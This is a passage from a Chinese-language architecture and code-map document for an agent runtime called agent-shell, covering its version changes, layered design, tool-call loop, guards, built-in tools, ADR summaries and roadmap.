  - `index.ts` — `createStateLine()` factory，返回 `{compressor, warehouse, query, subscribe, close}`
- **7 个修改文件**：
  - `registry.ts` — `execute(name, args, ctx?: ToolContext)` 第三参数 optional
  - `state-query.ts` — stub → real：queryText→chromadb RAG，stamps/range/layer→jsonl 直读，无 LLM（§7.2 #1）
  - `loop.ts` — `IMLoopOptions.stateLine?: StateLine`（optional，JSDoc "Will be required in v0.10.3"），ctx 传给 registry.execute
  - `system-agent.ts` — factory 第 9 字段 `stateLine: StateLine`（required）
  - `register.ts` — 第 5 参数，`createStateQueryTool()` 改用 ctx
  - `system-agents/index.ts` — SystemAgentDeps 加 stateLine
  - `minimal.ts` — `stateLine?: StateLine` optional + noopStateLine default
- **3 个测试文件 21 个新测试**：state-line（12）、chroma-bridge（5）、state-query（4）

**v0.10.1 重要变化**（vs v0.9）—— ADR-016 的初始三 projection plumbing 落地；其 split-store prompt assembly 已由 v0.10.4 contract correction supersede：

- **§A Databus 收窄**：[已验证] `databus.ts` 只接受 `role: 'tool'`（含 `sourceAgentId`）；v0.10.1 的 `conversation-memory.ts` 只保存 user/assistant，现由 v0.10.4 计划扩展为 canonical user/assistant/tool sequence；`turn.ts` 提供统一转换；`loop.ts` 的 split assembly 由 v0.10.4 修正。+14 tests。
- **§B Mailbox**：[已验证] `src/im/mailbox/` 提供私有 FIFO per `AgentId`，无 cross-inbox read。+9 tests。
- **§C System Agent Factory**：[已验证] `system-agent.ts`、`system-agents/index.ts`、`register.ts` 和 7 个工具已落地；system agent 的私有 canonical sequence / tool projection 接线由 v0.10.4 计划补齐。+12 tests。
- **代码审查修复（12 issues P0-P3）**：[已验证] ADR 签名同步、metrics bug 修复、工具 schema 对齐、mailbox API 修正、7 个新工具补测试、executeToolCalls 类型改进。+5 tests。
- **ADR-016**：当前契约已同步为 canonical conversation + Databus/StateLine/Mailbox projections；v0.10.4 的源码 correction 尚未实现。

**v0.9 重要变化**（vs v0.8）—— IM-GUIDE 接线可跑 + errorRate 端到端 producer 测试补齐：

- **P1-2 修：`stream: true` 自动注入** —— `src/protocol/client.ts:doFetch` 之前只注入 `stream_options.include_usage`，**漏了** `stream: true` 本身。OpenAI 兼容 API 不带 `stream: true` 时返回单段 JSON 而非 SSE，`parseSSEStream` 解析出 0 个 chunk，IM 拿到 `content: null + 无 tool_calls` → 静默 `'completed'`，用户拿到空答案。修复：把 `stream: true` 自动注入（与 `stream_options.include_usage` 对称），caller 显式 `stream: false` 时尊重 caller 决定。
- **P1-2 修：IM-GUIDE 示例修正** —— 之前示例 `import { streamChat } from 'agent-shell/protocol/client'` 直接传给 `runIMLoop` 是**类型不兼容**的——`client.ts:streamChat` 是 `(url, request, options) => ...`（3 参，必填 `onUsage`），而 `runIMLoop` 期望 `(url, request) => ...`（2 参）。新示例给一个 1 行 adapter，**不是** protocol 层的兜底（onUsage 是必填意图，保留类型层强制），是文档里讲清怎么桥。**Common mistake** 段警告读者：直接传 `streamChat` 是 copy-paste 必崩的。
- **P2-1 修：errorRate 端到端 producer 测试补齐** —— ADR-014 明确规定每个 guard 需要端到端 producer 链测试。token/iter/time/toolRate 都有（v0.6 修），唯独 errorRate 漏了。`tests/im/loop.test.ts:errorRate guard` 块新增 3 条：
  1. N 轮连续失败 → 第 11 轮 trip（默认 `maxConsecutiveToolErrors: 10`，严格 `>`）。
  2. Alternating success/failure **不** trip（成功轮 reset counter；这是 `config.ts:20` 注释的 known limit）。
  3. 1 轮 N 个失败工具只 `+1`（不是 N），证明 producer 是按 round 不是按 call。
- **P1-2 测试补**：2 条新 client.test.ts 断言 stream 注入契约——auto-inject `stream: true` + 保留 caller `stream: false`。
- **无新 ADR**：这两条都是"按现有 ADR 边界 + 类型契约"的执行级修复，没有新架构决策。

**v0.8 重要变化**（vs v0.7）—— ADR-010 废止（工具桶根除）+ errorRate 边界澄清：

- **ADR-010 superseded**：`src/im/tools/buckets.ts` 整文件删除（6 个死导出、ADR-015 违反）；8 处工具 schema 描述里的 `reads 桶, max 5` / `commands 桶, max 3` 全部清理；LLM 不再看到"它不能信任的上限"。
- **错误流边界澄清**：ADR-013 中段修订，写明 `errorRate` guard 是 **session 兜底**（不识别哪个工具失败，只在 N 轮连续失败时终止 session），与**工具内部自校验**（`path.ts:resolvePath` / `requireReason` / `write.ts:isBlocked` / 各工具顶部 arg 检查）边界分明——前者是 session 终止信号，后者是给 LLM 看的反馈。
- **新文档**：`docs/DECISIONS.md` 末尾追加 `## ADR-010 superseded (2026-08-27)` 段，记录根除依据、保留的 4 类工具内部校验清单、未来回归保护。
- **测试**：192 → 192（ADR-010 段；v0.9 才涨到 197）。
- 改动量：删 1 文件 + 改 3 代码文件（index.ts/bash.ts/powershell.ts）注释 + 改 2 文档（CODE_MAP、DECISIONS）+ 改 1 README 引用。

**v0.7 重要变化**（vs v0.6）—— time guard 最后一轮盲区修复 + 全库死代码清理（ADR-015）：

- **time guard 最后一轮盲区修复**：此前 `shellCall` 在 `advanceElapsed` **之前**算 guards，单轮慢响应（无 tool calls 直接 `completed` 的那一轮）永不触发 time guard。现在 guard 评估点**唯一化**——IM 在每次 `shellCall` 后先 `advanceElapsed` 再 `runGuards`，含最后一轮。`ShellCallResult` 删掉 `hits` 字段（entry gate 保留）。
- **死代码清理**（删除而非注释）：`src/shell/snapshot.ts`、`src/im/error.ts`、`src/shell/json-schema.ts` 三个文件整体删除；`isRunning` / `isTerminal` / `parseChatCompletionResponse` / `isGlobPattern` / `addError` / `resetErrors` / `Metrics.consecutiveErrors` / `ShellConfig.protocolRetries` / `Databus.last·clear·subscribe` / `IMLoopResult 'no-stream-content'` 全部删除。
- **接线 bug 修复**：`StreamOptions.maxRetries / baseDelayMs` 此前声明了但被 `streamChat` 忽略（用硬编码默认值）——现在真正接线。
- **`addToolCall` → `addToolCalls(m, n)`**：匹配唯一调用点的批量语义，`call.ts` 不再手写 spread。
- **新规则（ADR-015）**：每个导出符号必须有自身测试文件之外的调用者；每个 `Metrics` 字段必须有 producer **和** guard reader；禁止"保留字段"。
- 测试数 200 → 189：删的是已死 API 的测试，guard producer 链全部保留端到端测试。

**v0.6 重要变化**（vs v0.5）—— guard 可达性修复 + 死代码清理：

- **time guard 修复**：`src/im/loop.ts` 新增 `advanceElapsed(metrics, loopStart, now)` helper，`runIMLoop` 在循环开始记录 `loopStart = Date.now()`，每次 `shellCall` 后调用 `advanceElapsed`。此前 `metrics.elapsedMs` 从未被任何代码写入，时间守卫的 `maxElapsedMs` 阈值不可达。
- **iter guard 修复**：`src/shell/call.ts` 把 `stepCount` 推进从 `if (usage) { ... }` 块里挪出来，改为无条件 `addStep(deps.metrics)`。OpenAI 流式默认不发 usage chunk，vllm/ollama 兼容模式也不发——此前 `stepCount` 在不发 usage 的 provider 下永远是 0，iter guard 形同虚设。
- **token guard 修复**：`src/protocol/client.ts:streamChat` 自动给请求注入 `stream_options: { include_usage: true }`，caller 可显式覆盖。OpenAI 默认不发 usage，必须 opt-in。
- **死代码清理**：`src/im/tools/glob.ts:globToRegex` 的 if/else 死分支折叠成单条"两边都不是 `**` 时加 `/`"；`src/im/loop.ts` 中未使用的 `addStep / addUsage / addError / resetErrors / type Usage` import 删掉。
- **测试副本清理**：`src/im/tools/__tests__/glob.test.ts`（89 行旧副本）删除，保留 `tests/im/tools/glob.test.ts`（93 行完整版）。
- **回归保护**：`tests/im/loop.test.ts:max-steps guard` 不再发 usage chunk（验证 `iter` guard 真正独立于 usage）；`tests/shell/call.test.ts:step counting without usage` 验证 `stepCount === 1` 即使无 usage；`tests/shell/guards.test.ts:timeGuard` 增加了 `advanceElapsed` 的 regression-pin（导入 `im/loop.ts` 验证 producer 存在）。
- **新增 ADR-014**：「every guard must be reachable on the happy path」（[DECISIONS.md](./DECISIONS.md)）。

---

## 1. 一句话定位

`agent-shell` 是一个**独立的 agent runtime**，由三层组成：

| 层 | 角色 | 关键文件 |
|---|---|---|
| **shell** | runtime guard（5 个守卫）+ 状态机（3 态漏斗） | `src/shell/` |
| **protocol** | OpenAI 兼容的 SSE 流式调用 + 429/503 重试 5 次 | `src/protocol/` |
| **IM** | 业务核心（databus + conversation-memory + mailbox + system-agent + tool registry + compose + loop） | `src/im/` |

**v0.10.1 新增 IM 子模块**（ADR-016）：

| 子模块 | 职责 | 关键文件 |
|---|---|---|
| **databus** | `role: 'tool'` only 的 projection copy；cross-agent 可读，不是 working prompt 的第二份历史 | `src/im/databus.ts` |
| **conversation-memory** | canonical ordered `role: 'user' | 'assistant' | 'tool'` sequence；是 prompt 和 task-block 的唯一顺序来源（v0.10.4 计划） | `src/im/conversation-memory.ts` |
| **mailbox** | agent 间私有 FIFO 通信；隐私不变量（不可读他人 inbox） | `src/im/mailbox/` |
| **system-agent** | warehouse / compressor / recall 三个 system agent 的 factory | `src/im/system-agent.ts` + `src/im/system-agents/` |
| **state-line** | filesystem-persistent 分层视图（M1/M2/M3）；11-field CuratedMemory + chromadb RAG | `src/im/state-line/` |
| **prompts** | 4 个 agent system prompt .md 文件 + loader | `src/im/prompts/` |
| **minimal** | `createMinimalIM(opts)` 一行启动 factory | `src/im/minimal.ts` |

**v0.15+ 新增模块**（v0.14 之后长出的一层，这里只列"新读者该知道存在"的部分）：

| 子模块 | 职责 | 关键文件 |
|---|---|---|
| **security** | SecurityRouter + SecurityDoor 体系（危险命令 / 敏感路径 / 写审批），per-session 安全状态 | `src/security/router.ts` + `src/security/doors/` |
| **signals** | Signal Gate——前后端信息流的唯一管理点；含 v0.34 的 per-session 会话排队 | `src/signals/gate.ts` + `src/signals/session-queue.ts` + `src/signals/wiring/` |
| **host** | 宿主装配层：把 config / MCP / skill / session / tools 拼成可跑的 harness | `src/host/assembly.ts` |
| **im/hooks** | HookSystem 点位（低配信号关，保留为可观测性）——审计 / 上下文注入 / 错误恢复 | `src/im/hooks/` |
| **im/session** | 多会话：session-manager + session-store（落盘）+ recovery + bus-registry | `src/im/session/` |
| **im/prompt** | 分层 prompt 拼装（layer / section builder）+ 静态提示词 | `src/im/prompt/` |
| **im/compaction** | 压缩引擎 + handoff prompt（v0.31 起与 system-agent 记忆合流） | `src/im/compaction/` |
| **config** | databus 设置 / 模型能力表 / 路径与读写 | `src/config/` |
| **rendering** | 渲染基座（规则 + hooks + md 渲染 + 渲染期信号总线） | `src/rendering/` |
| **webshell** | Web UI 服务端（auth / stream / server） | `src/webshell/` |

**核心设计哲学（5 条，详见 `docs/DECISIONS.md`）**：

1. **状态机是漏斗，不是 FSM**（ADR-002）— 3 态（Running/Tripped/Dead），无 Recovering/转移表
2. **shell 状态永不进 LLM 视野**（ADR-004）— 终止结果（`finalState`/`hits`）只是给 caller 的控制信号，不进 prompt
3. **IM 是一等公民**（ADR-003）— shell/protocol 只是基础设施，业务在 IM
4. **协议层是纯函数**（ADR-007）— IM → shell → protocol 单向调用，无 EventChannel
5. **一层代码，无防御兜底**（ADR-009）— 不写 `try { try {} } catch {}`，靠测试找 bug

---

## 2. 数据流（一张图说清调用链）

```
用户/上游 app
   ↓
runIMLoop({ registry, databus, config, streamChat, ... })
   │
   │  ┌─ 循环每一轮 ──────────────────────────────────┐
   │  │                                              │
   │  │  1. compose(parts) → FinalPrompt             │
│  │     parts = [system, userTemplate,            │
│  │              systemTool[], mcp[], skill[],    │
│  │              ...canonical turns in order]     │
   │  │                                              │
   │  │  2. shellCall(deps, finalPrompt)              │
   │  │     ├─ gate(state)  → 拒 if Tripped/Dead     │
   │  │     ├─ streamChat(url, req) → StreamChunk    │
   │  │     │     └─ withRetry(429/503, 5x)          │
   │  │     └─ metrics ← addStep / addUsage /        │
   │  │        addToolCalls                          │
   │  │        → { response, updatedMetrics,         │
   │  │            toolCalls }                       │
   │  │                                              │
   │  │  3. advanceElapsed(metrics, loopStart)  (IM) │
   │  │     runGuards(metrics, config) → GuardHit[]  │
   │  │     hits > 0 → terminate 'guard-tripped'     │
   │  │     (含最后一轮——time guard 无盲区, ADR-015) │
   │  │                                              │
   │  │  4. 写 assistant turn 到 canonical              │
│  │     ConversationMemory
   │  │                                              │
   │  │  5. toolCalls.length === 0?                   │
   │  │     → terminate 'completed'                  │
   │  │     else:                                    │
   │  │       executeToolCalls(toolCalls, registry)  │
   │  │         ├─ parseToolCallArguments (per call) │
   │  │         ├─ try registry.execute (per call)   │
   │  │         │     on throw:                       │
   │  │         │       'Tool "X" failed: <msg>'     │
   │  │         └─ append tool turns to canonical    │
│  │            + Databus projection              │
   │  │                                              │
   │  │  6. errorCount > 0?                          │
   │  │     addToolError(metrics)                    │
   │  │     else:                                    │
   │  │     resetToolErrors(metrics)                 │
   │  │  7. loop                                    │
   │  └──────────────────────────────────────────────┘
   ↓
IMLoopResult { terminated, reason, finalState, hits, turns }
```

**一句话总结**：IM 负责"什么时候问、问什么、怎么用答"；shell 负责"该不该问、问完检查"；protocol 负责"把请求送出去"。**工具错误是普通 tool result**（deepseek 风格），不是特殊 verdict——LLM 在下一轮自己改。

---

## 3. 三层职责（不许跨层）

| 层 | 知道 | 不知道 |
|---|---|---|
| **shell** | 状态、metrics、config、guards、gate、registry、compose、call | 业务（databus/tool 选择/prompt 内容） |
| **protocol** | OpenAI 请求/响应 schema、SSE 解析、重试策略、fetch | shell 状态、IM 业务、tool 注册 |
| **IM** | turns、databus、tool 执行、loop | 状态机内部实现、SSE 解析细节 |

**依赖方向（硬约束）**：
- `shell` 只能 `import` 自 `protocol/types.ts`（纯数据类型）
- `protocol` 不能 `import` 自 `shell` 或 `im`
- `im` 可以 `import` 自 `shell` 和 `protocol`（它是组合层）
- `shared/` 是 shell 和 protocol **共同依赖的纯类型**（如 `JSONSchema`），不依赖任何层

---

## 4. 7 条不变量（由测试强制保证）

完整版见 `docs/ARCHITECTURE.md`，这里列最重要的：

1. **shell 无业务字段** — 只有 `state / metrics / config / hits`
2. **shell 状态永不进 LLM 视野** — 终止结果（`IMLoopResult.finalState/hits`）只是给 caller 的控制信号
3. **工具启动时注册，不热插拔** — `register*()` 只在 startup 调
4. **协议层只重试 429/503，5 次，指数退避** — 其他错误原样上抛
5. **LLM 用 OpenAI 原生 function calling** — `tools` 字段，protocol 不做任何转换
6. **tool result 写回 databus 用 `role: 'tool'`** — 与 OpenAI 协议对齐，**只**三字段 `{ role, tool_call_id, content }`，**不**有 `isError` / `error: ` 前缀
7. **IM loop 只有 4 种退出原因** — `completed / guard-tripped / protocol-error / shell-terminated`，无无限循环兜底

**违反任意一条 = 拒绝合并**。

---

## 5. 工具（v0.9 的 8 个内置 + v0.10.1 的 7 个 system-agent 工具，已扩到 29 个工具名）

**当前工具清单**（29 个工具名声明，均在 `src/im/tools/` 下）：

| 分类 | 工具 |
|---|---|
| 文件读写 | `read` `write` `edit` `search_replace` `ls` `find` `grep` `ast_grep` |
| shell | `bash` `powershell` |
| 网络 / 媒体 | `web_fetch` `open_url` `read_media` |
| 进程监督 | `list_processes` `kill_process` |
| 子代理 | `run_subagent` `define_subagent` |
| 渐进披露 / 交互 | `load_tools` `request_user_input` |
| system-agent（warehouse/compressor/recall） | `databus_query` `databus_subscribe` `state_query` `compress_block` `ask_recall` |
| mailbox | `mailbox_send` `mailbox_read` `mailbox_markread` `mailbox_status` |
| 记忆落盘 | `record_curated_block` `record_m3_summary` |

**两类工具安全**（v0.15/v0.16 加入，与"工具自校验"正交）：
1. **SecurityDoor**（`src/security/doors/`）——注册期挂载的门禁：危险命令分类器（v0.35 起按 shell 方言分表）、敏感路径、写审批。
2. **工具自校验**（throw → `wrapTool` 干净英文句子给 LLM）——见下表"自校验点"列。

### v0.9 8 个内置工具（ADR-010 桶已废止 — 工具自校验）

`createBuiltinTools({ cwd })` 工厂注册 8 个 system tool 到 `ToolRegistry`：

| 工具 | 类别 | 自校验点 |
|---|---|---|
| `read` | 纯读 | `path.ts:resolvePath` 拒逃逸 cwd |
| `ls` | 纯读 | 同上 |
| `find` | 纯读 | 同上 + `loadGitignore` 尊重 .gitignore |
| `grep` | 纯读 | 同上 + 同上 |
| `bash` | 有副作用 | `wrapReason` 拒非字符串 command / 抛 spawn 失败 |
| `powershell` | 有副作用 | 同上（Windows） |
| `write` | 有副作用 | `path.ts:resolvePath` + `write.ts:isBlocked` 拒 OS 受保护目录 |
| `edit` | 有副作用 | `path.ts:resolvePath` + 重复 `oldText` 报错（edit 内部） |

### v0.10.1 7 个 system-agent 工具（ADR-016）

`registerSystemAgentTools(registry, mailbox, workingAgentId, systemAgents)` 注册 7 个新工具，用 **closures** 捕获依赖（不改 `ToolExecutor` 签名，8 个 v0.9 工具零改动）：

| 工具 | 关联 system agent | 输入 | 输出 |
|---|---|---|---|
| `databus_query` | warehouse | `{ sourceAgentIds?, range?, limit? }` | `readonly ToolTurn[]` |
| `databus_subscribe` | warehouse | `{ sourceAgentIds? }` | unsubscribe handle |
| `state_query` | warehouse | `{ stamps?: string[], range?, layer?, queryText?, limit? }` | `readonly StateLineEntry[]`（v0.10.2: jsonl 直读 + chromadb RAG，无 LLM） |
| `compress_block` | compressor | `{ block: ToolTurn[], intent? }` | `CuratedMemory`（11-field） |
| `ask_recall` | recall | `{ query: string, scope: 'compressed' \| 'archive' \| '*', limit? }` | `{ answer, evidence, reason }` |
| `mailbox_send` | (direct API) | `{ to, subject, body, replyTo? }` | `void`（`from` = `workingAgentId`，closure 捕获） |
| `mailbox_read` | (direct API) | `{ unreadOnly?, limit? }` | `readonly MailItem[]`（`agentId` = `workingAgentId`，closure 捕获） |

**桶已废止**（ADR-010 superseded 2026-08-27）：早期设计曾有 reads 桶 max 5 / commands 桶 max 3 的"全局工具调用上限"层（`tool-runner.ts` 5-phase verdict），属于跨层耦合——判决层必须知道每个工具的 contract。已删除 `tools/buckets.ts`、相关 schema 描述、ADR-010。详见 [DECISIONS.md ADR-010 superseded](./DECISIONS.md) 段。

**两类工具熔断**（v0.8 后的清晰边界）：

1. **工具内部校验**（throw → `wrap`/`wrapReason` → 干净英文句子给 LLM）——上面表格"自校验点"列
2. **session 兜底**（`errorRate` guard）——只数"有没有失败"，不识别"哪个工具失败"；N 轮连续失败 → session 终止（`state: 'Tripped'`）

**reason 必填**：每个工具 schema 都有 `reason: string` 字段（**不在 `required` 里**，避免严格 schema 的 coding plan 服务报错）。**`src/im/tools/validate.ts:requireReason()` 在每个工具的 `execute()` 入口验证**。

**为什么工具自验证**：协议层不动；状态机不动；工具 execute 自管。`tools/index.ts` 的 `wrap()` 抓 throw → `Tool "X" failed: <msg>` 字符串返回。

未来 8 个工具扩展到 20+ 时，按 [DECISIONS.md ADR-011](./DECISIONS.md) 切到 atomcode 风格的 `parallel_safe` 工具自描述。

---

## 6. ADR 摘要（001–036）

**编号现状（2026-09-22 校正）**：`docs/DECISIONS.md` 收录 **ADR-001 → 036**（ADR-010 已 superseded；无 ADR-011/012 独立段——011 是备选方案表、012 的演进路径已被 013/015/016 取代），`docs/adr/` 收录 0016 → 0036 的完整文本。**本表只摘到 019 为止**——ADR-020 及之后的完整文本在 `docs/adr/00XX-*.md`。

| ADR | 主题 | 关键决策 |
|---|---|---|
| 001 | databus = 上下文投影层 | 愿景：投影层注入 harness（**v0.10.1 已部分实现**——databus 收窄为 `role: 'tool'` only） |
| 002 | shell = 漏斗 | 3 态（Running/Tripped/Dead），无转移表/恢复机制 |
| 003 | IM = 一等公民 | shell/protocol 是基础设施，业务在 IM |
| 004 | shell 状态永不进 LLM | 防 LLM 看见"rate-limited"后试图绕开 |
| 005 | 形态 A：OpenAI 原生 function calling | `tools` 字段，不污染 `messages` |
| 006 | 工具显式注册 | 统一 `ToolRegistry`（systemTool/MCP/skill） |
| 007 | shell/protocol 是对等而非 EventChannel | 单向调用，IM 编排 |
| 008 | 协议层重试 429/503，5 次 | 其他错误原样上抛 |
| 009 | 一层代码，无防御兜底 | 靠测试找 bug，不靠 `if` 堆叠 |
| 010 | 桶分桶 + 必填 reason | **superseded 2026-08-27**（桶已根除；reason 归 ADR-013） |
| 011 | 备选方案 | atomcode parallel_safe / dispatch_tools 填字表（暂不启用） |
| 012 | 架构演进路径 | Phase 1~4（已为 ADR-013/015/016 取代，见下） |
| 013 | tool 错误流 = 普通 content；连续错误熔断 = guard | deepseek 风格三字段；`consecutiveToolErrors` 喂 guard，10 次熔断 |
| 014 | every guard 可达 | 每个 guard 的 producer 链必须有端到端测试，纯函数单测不够 |
| 015 | guard 单一评估点 + 无死代码 | IM 在 `advanceElapsed` 后评估（含最后一轮）；每个导出必须有调用者，禁止"保留字段" |
| **016** | **canonical conversation + projections (v0.10)** | **ConversationMemory 是 ordered user/assistant/tool canonical sequence；Databus 是 `role:'tool'` projection；StateLine + Mailbox 仍为 projections；v0.10.4 已落地** |
| **017** | **Sub-agent Databus boundary + security hardening (v0.11)** | **two-bus architecture (ctxDatabus + MultiDatabus) + P2.1-P2.8 security boundaries；v0.11.1 已落地**（注：DECISIONS.md 中的 ADR-017 是"修复方案1 P0-P9"，与本 ADR 文件双轨——见 DECISIONS.md 注释） |
| **018** | **MCP / Skill 扩展系统 (v0.13)** | **stdio+HTTP MCP 连接 + JS/TS 模块 skill + 子代理经 policy 开放 + SDK 隔离在 src/mcp/；推翻 ADR-016 §11 "no mcp/skill ecosystem"** |
| **019** | **Wiki System Agent — code-domain knowledge base (v0.13.1)** | **wiki-mcp server（代码领域适配，独立进程 stdio 连接）+ 上下文注入守卫 ctx.isWikiAgent + wiki__ 命名空间隔离 + scan_codebase 路径指针 + MD 渲染复用 literature 管线 + 前端 API 契约 = 工具 schema** |
| **020** | **observability contract (v0.14)** | **structured logger + 关键事件日志化 + MCP stdio env 白名单（不再整包继承 process.env）+ turn.id UUID 化** |
| **021** | **memory config 与 sub-agent depth (v0.14)** | **M0–M3 阈值（200K/500K/900K）从常量迁为可配置；`maxSubAgentDepth` 默认 3，子代理只能调低** |
| **022** | **Tool Security + Search Enhancement (v0.15)** | **敏感路径 / 危险命令分类器（`checkDangerousCommand` 单一评估点）+ rg 硬依赖搜索** |
| **023** | **v0.16 Security Extension + Phase 2 Tool Security Audit** | **SecurityRouter + SecurityDoor 体系 + per-session 安全状态；敏感读硬拒 / 写走审批的二分** |
| **024** | **提示词工程设计决策 (v0.19)** | **分层 prompt 拼装（layer/section builder）+ 静态提示词边界**（文件 `0024-prompt-engineering-decisions.md`，2026-09-11 由 0023 顺移） |
| **025** | **Hook System Repair (v0.20)** | **HookSystem 归位：审批 / 审计 / 上下文注入 hook 点位；后由 v0.34 决议降级为"低配信号关"，保留不接线** |
| **026** | **Signal Gate — 信号关 (v0.21)** | **前后端信息流的唯一管理点（纯路由定位）；v0.34 在其上挂会话排队** |
| **027** | **前端商业化两决策** | **套餐入口 / 引导智能体——已拍板，上线前才做** |
| **028** | **args 持久化与用户同意** | **工具参数落盘 + 用户同意留痕**（仅 `docs/adr/` 有文本） |
| **029** | **per-session 权限** | **权限按会话隔离，不跨会话继承**（仅 `docs/adr/` 有文本） |
| **030** | **安全二分法** | **敏感读 = 硬拒，破坏性写/命令 = 审批**的判定原则（仅 `docs/adr/` 有文本） |
| **031** | **工具压缩与 system-agent 记忆 (v0.31)** | **压缩块协议改造 + system-agent 记忆分层**（仅 `docs/adr/` 有文本） |
| **032** | **文件可恢复 (v0.36/v0.36.1)** | **写前留底快照（白名单 + 四道闸门）+ `session.rewind` 用户回滚；索引写串行化、边界显性化。全文 `docs/adr/0032-file-recovery-and-rewind.md`** |
| **033** | **提示词模型族路由 (v0.37)** | **唯一基底 + 两个可注入槽位（人格 / workflow）；安全、双工具披露、架构与记忆契约结构上不可被变体覆盖。全文 `docs/adr/0033-prompt-model-family-routing.md`** |

---

## 7. 演进路径（Phase 1~4 + v0.10 projections）

```
Phase 1 (✅ done): 8 个核心工具 + shell/protocol/im 三层 + ADR-010~015
v0.10.1 (✅ done):  三信息流——databus 收窄 + mailbox + system-agent factory + 7 新工具 (ADR-016)
v0.10.2 (✅ done):  state-line——curatedMemory.jsonl + index.jsonl + chromadb RAG + embed.py + 11-field schema
v0.10.3 (✅ done):   context injection——M0-M3 动态投影 (200K/500K/900K) + mailbox 未读 hint + stateLine required
v0.10.4 (✅ done):  canonical order + projection + auto-drive (drive-coordinator.ts + find-task-block.ts)
v0.11   (✅ done):  sub-agent Databus boundary + security hardening (ADR-017) — two-bus (ctxDatabus + MultiDatabus) + P2.1-P2.8
v0.11.2 (✅ done):  修复方案1 P0-P9 (DECISIONS ADR-017) — wrapTool re-throw / fresh state / mailbox ctx / lastRequestTokens / memory layering / databus determinism / ProtocolError retriable / SSE buffer / empty tools omit / jsonl cache
v0.12   (✅ done):  hierarchical sub-agent tree (AgentTree + AgentNode) + family-bus isolation + UUID instance id + rebindRoot
v0.12.1 (✅ done):  mail receipts (sentStatus)
v0.12.2 (✅ done):  tool-registration iron rule + 子代理工具访问 blanket ban
v0.12.3 (✅ done):  compression replacement (atomized compress-block)
v0.12.4 (✅ done):  restore parallel compression
v0.13   (✅ done):  MCP/Skill 扩展系统 (ADR-018) — stdio+HTTP MCP + JS/TS 模块 skill + 子代理经 policy 开放 + SDK 隔离 + resolveRef 单分类器 + bootstrapExtensions 一键装配
v0.13.1 (✅ done):  Wiki System Agent (ADR-019) — code-domain wiki-mcp server + ctx.isWikiAgent 守卫 + wiki__ 命名空间 + scan_codebase + render_md
v0.14   (✅ done):  observability + config cleanup (ADR-020/021) — structured logger + memoryConfig + maxSubAgentDepth
v0.15   (✅ done):  工具安全 + rg 搜索 (ADR-022) — 危险命令分类器 / 敏感路径 + SystemSecurityHook
v0.16   (✅ done):  SecurityRouter + SecurityDoor 体系 (ADR-023) — 危险命令 / 敏感路径 / 写审批三门 + per-session 状态
v0.17   (✅ done):  loop↔hooks 解耦 + 多会话与历史恢复
v0.18   (✅ done):  渐进式工具披露 (load_tools)
v0.19   (✅ done):  prompt 工程 + code specs + MEMORY.md (ADR-024)
v0.20   (✅ done):  hook 修复 (ADR-025) + 渲染基座
v0.21   (✅ done):  Signal Gate 基础设施 (ADR-026)
v0.22   (✅ done):  Web UI (src/webshell/)
v0.23   (✅ done):  设置与 provider 管理 (src/config/)
v0.24   (✅ done):  交付物 UX
v0.25   (✅ done):  装配修复 + 设置部署
v0.26   (✅ done):  CLI / TUI
v0.27   (✅ done):  read-before-edit
v0.28   (✅ done):  工具自描述 + KimiCode 对齐 (ast_grep / search_replace)
v0.30   (✅ done):  压缩 + system-agent 记忆
v0.32   (✅ done):  模型目录 + 推理控制
v0.34   (✅ done):  并发与持久化 — Signal Gate 会话排队 + 僵尸目录防护 + mailbox 落盘/3 天 TTL + 子代理工作区上下文
v0.35   (✅ done):  PowerShell 危险命令加固 — 分类器按 shell 方言分表 + &/换行分隔符 + 操作数后置 flags + 内嵌 PS 宿主检测
v0.37   (✅ done):  提示词模型族路由 — 唯一基底 + 人格/workflow 双槽位，路由 deepseek / glm，未命中回落通用段
v0.38   (✅ done):  子代理角色预置 + 模型族扩展 — explore/editor 内置 + 四层组装 + 交互协议；路由扩 kimi/qwen/gpt/claude
Phase 2 (absorbed): databus 持久化 → 由 state-line 承担（ADR-016 §4）
Phase 3 (absorbed): 专家团 → 由 system-agent factory + mailbox 承担（ADR-016 §3）
Phase 4 (partial):  production hardening — 已落：可观测性（v0.14）、多会话恢复（v0.17）、并发与持久化（v0.34）；未落：metrics 导出、错误恢复面收敛
```

**v0.10 三步实现计划**（ADR-016 §8）：

| 步 | 内容 | 状态 | 测试 |
|---|---|---|---|
| v0.10.1 §A | databus 收窄 + conversation-memory | ✅ done | +14 |
| v0.10.1 §B | mailbox 基础设施 | ✅ done | +9 |
| v0.10.1 §C | system-agent factory + 7 新工具 | ✅ done | +12 |
| v0.10.1 fix | 代码审查 12 issues P0-P3 | ✅ done | +5 |
| v0.10.2 | state-line + embed.py + chromadb RAG | ✅ done | +19 |
| v0.10.3 | context 动态投影 (M0-M3) | ✅ done | +14 |
| v0.10.4 | canonical order + projection + auto-drive | ✅ done | +6 |

---

## 8. 文件索引（按目录）

> 下面这棵树是 **v0.10–v0.13 期 IM 核心的逐文件细节**（仍然准确，但已不是全貌）。
> **§8.1 才是当前全量目录清单**——v0.14 之后长出的 security / signals / host / config / rendering / webshell / cli 等层只在 §8.1 里。

```
agent-shell/
├── docs/
│   ├── CODE_MAP.md          ← 你正在读 (v0.35)
│   ├── ARCHITECTURE.md      ← 数据流 + 不变量 + 测试策略
│   ├── DECISIONS.md         ← ADR-001→031 汇总（含 020/021/025/028–031，2026-09-11 补齐）
│   ├── IM-GUIDE.md          ← IM 业务集成（databus/registry/compose/loop/mailbox/system-agent/state-line）
│   ├── adr/
│   │   ├── 0016-information-flow-architecture.md  ← ADR-016 完整文本（§11 已被 ADR-018 推翻）
│   │   ├── 0017-sub-agent-databus-boundary.md     ← ADR-017 sub-agent 两总线 + 安全加固
│   │   ├── 0018-mcp-skill-extension.md            ← ADR-018 MCP/Skill 扩展
│   │   ├── 0019-wiki-system-agent.md              ← ADR-019 Wiki System Agent (v0.13.1)
│   │   ├── 0020-observability-contract.md         ← ADR-020 structured logger + 必保事件清单
│   │   ├── 0021-memory-config-and-sub-agent-depth.md ← ADR-021 MemoryConfig + maxSubAgentDepth
│   │   ├── 0022-tool-security-and-search-enhancement.md ← ADR-022 危险命令分类器 + rg
│   │   ├── 0023-v0.16-extension-and-phase2-audit.md ← ADR-023 SecurityRouter/Door 单一权威
│   │   ├── 0024-prompt-engineering-decisions.md   ← ADR-024 提示词工程（原 0023，09-11 顺移）
│   │   ├── 0025-hook-system-repair.md             ← ADR-025 hook 体系修复 + 并发分桶
│   │   ├── 0026-signal-gate.md                    ← ADR-026 信号关
│   │   ├── 0028-args-persist-and-user-agreement.md ← ADR-028 args 落盘 + 用户知情
│   │   ├── 0029-per-session-permission.md         ← ADR-029 per-session 权限
